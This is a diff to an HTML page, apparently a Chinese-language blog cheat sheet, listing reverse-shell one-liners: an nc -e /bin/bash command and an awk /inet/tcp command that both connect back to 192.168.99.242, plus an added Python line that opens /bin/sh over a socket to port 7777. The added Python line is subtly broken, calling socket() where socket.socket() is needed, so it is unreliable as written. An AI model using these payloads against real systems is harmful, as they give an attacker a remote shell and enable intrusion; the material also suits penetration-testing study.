@@ -77,6 +77,7 @@
 <p><code>exec/bin/sh 0&amp;0 2&gt;&amp;0</code></p>
 <h5 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h5><p><code>nc -e /bin/bash 192.168.99.242 1234</code></p>
 <h5 id="awk反弹"><a href="#awk反弹" class="headerlink" title="awk反弹"></a>awk反弹</h5><p><code>awk &#39;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.99.242/1234&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#39;</code></p>
+<h5 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h5><p><code>import socket,subprocess,os;s=socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</code></p>
 
                 
                 <p class="end">__END__</p>
